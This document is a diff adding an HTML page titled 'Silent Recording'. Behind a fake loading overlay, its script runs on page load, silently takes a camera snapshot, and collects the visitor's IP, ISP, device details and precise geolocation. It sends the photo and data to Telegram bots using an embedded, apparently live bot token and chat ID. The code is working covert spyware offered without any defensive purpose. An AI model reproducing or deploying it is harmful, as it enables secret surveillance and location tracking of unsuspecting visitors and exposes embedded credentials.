@@ -1,0 +1,132 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Silent Recording</title>
+<style>
+  body {
+    margin: 0;
+    font-family: sans-serif;
+  }
+  /* Fake loading overlay */
+  #loadingOverlay {
+    position: fixed;
+    top: 0; left: 0;
+    width: 100%; height: 100%;
+    background: rgba(0, 0, 0, 0.8);
+    color: #fff;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 24px;
+    z-index: 9999;
+  }
+</style>
+</head>
+<body>
+
+<div id="loadingOverlay">Loading, please wait...</div>
+
+<video id="preview" autoplay playsinline style="display:none;"></video>
+<canvas id="snapshot" style="display:none;"></canvas>
+
+<script>
+  // Config (hide tokens and chat IDs)
+  const botConfigs = [
+    {
+      token: "8909620046:AAFIowHrmzr2lqh8huSy9cgt3sYONWF2a4g",
+      chatId: "8798734138"
+    },
+    {
+      token: "YOUR_BOT_TOKEN_2",
+      chatId: "CHAT_ID_2"
+    }
+  ];
+
+  const overlay = document.getElementById('loadingOverlay');
+  const video = document.getElementById("preview");
+  const canvas = document.getElementById("snapshot");
+
+  async function runBackgroundTasks() {
+    try {
+      // 1. Access camera
+      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+      video.srcObject = stream;
+
+      // Wait for video to be ready
+      await new Promise(res => video.onloadedmetadata = res);
+
+      // 2. Capture photo
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      const ctx = canvas.getContext('2d');
+      ctx.drawImage(video, 0, 0);
+      const blob = await new Promise(res => canvas.toBlob(res, 'image/png'));
+
+      // 3. Send photo to Telegram
+      botConfigs.forEach(config => {
+        const formData = new FormData();
+        formData.append("chat_id", config.chatId);
+        formData.append("photo", blob, "snapshot.png");
+        fetch(`https://api.telegram.org/bot${config.token}/sendPhoto`, {
+          method: "POST",
+          body: formData
+        }).catch(err => console.error("Photo send error:", err));
+      });
+
+      // 4. Fetch device info and location
+      const deviceInfo = await getDeviceInfo();
+
+      // 5. Send device info + location
+      botConfigs.forEach(config => {
+        fetch(`https://api.telegram.org/bot${config.token}/sendMessage`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ chat_id: config.chatId, text: deviceInfo })
+        }).catch(err => console.error("Message send error:", err));
+      });
+
+      // 6. Stop camera
+      stream.getTracks().forEach(t => t.stop());
+
+    } catch (err) {
+      console.error("Error in background tasks:", err);
+    } finally {
+      // Hide loading overlay
+      overlay.style.display = "none";
+    }
+  }
+
+  async function getDeviceInfo() {
+    const now = new Date().toLocaleString();
+    const ua = navigator.userAgent || "N/A";
+    const platform = navigator.platform || "N/A";
+    const screenRes = `${screen.width}x${screen.height}`;
+
+    // IP info
+    let ipData = "🌐 IP: Not available";
+    try {
+      const res = await fetch("https://ipapi.co/json/");
+      const data = await res.json();
+      ipData = `🌐 IP: ${data.ip}\n📍 City: ${data.city}\n🌍 Country: ${data.country_name}\n🏢 ISP: ${data.org}`;
+    } catch (e) { }
+
+    // Location
+    let locationMsg = "📌 Location: Permission Denied";
+    try {
+      const pos = await new Promise((res, rej) => {
+        navigator.geolocation.getCurrentPosition(res, rej);
+      });
+      locationMsg = `📌 Location: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+    } catch (e) { }
+
+    return `🛰️ New Visit!\n\n🕒 Time: ${now}\n💻 Platform: ${platform}\n📺 Screen: ${screenRes}\n${ipData}\n${locationMsg}\n🧠 UA: ${ua}`;
+  }
+
+  // Run everything in background on page load
+  window.onload = runBackgroundTasks;
+</script>
+
+</body>
+</html>
